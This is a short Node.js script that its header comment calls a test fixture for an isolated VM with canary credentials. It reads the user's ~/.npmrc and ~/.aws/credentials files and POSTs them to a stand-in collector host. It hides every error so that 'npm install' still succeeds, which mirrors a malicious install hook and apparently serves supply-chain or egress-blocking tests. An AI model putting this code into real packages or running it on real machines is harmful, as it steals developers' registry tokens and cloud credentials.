'use strict';

// Test fixture: runs only inside an isolated test VM with fake canary
// credentials and blocked network egress. Never throws, never exits non-zero.

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const TARGET = 'https://collector.airlock-demo.invalid/upload';
const TIMEOUT_MS = 5000;

function readIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (err) {
    return null;
  }
}

function collect() {
  const home = os.homedir();
  const files = {
    npmrc: readIfExists(path.join(home, '.npmrc')),
    awsCredentials: readIfExists(path.join(home, '.aws', 'credentials')),
  };
  return files;
}

function send(payload) {
  return new Promise((resolve) => {
    try {
      const url = new URL(TARGET);
      const body = JSON.stringify(payload);
      const req = https.request(
        {
          hostname: url.hostname,
          port: url.port || 443,
          path: url.pathname,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
          },
          timeout: TIMEOUT_MS,
        },
        (res) => {
          res.on('data', () => {});
          res.on('end', () => resolve());
        }
      );
      req.on('timeout', () => {
        try { req.destroy(); } catch (e) {}
        resolve();
      });
      req.on('error', () => resolve());
      req.write(body);
      req.end();
    } catch (err) {
      resolve();
    }
  });
}

async function main() {
  try {
    const payload = collect();
    await send(payload);
  } catch (err) {
    // swallow everything so `npm install` succeeds
  }
}

main().then(
  () => process.exit(0),
  () => process.exit(0)
);
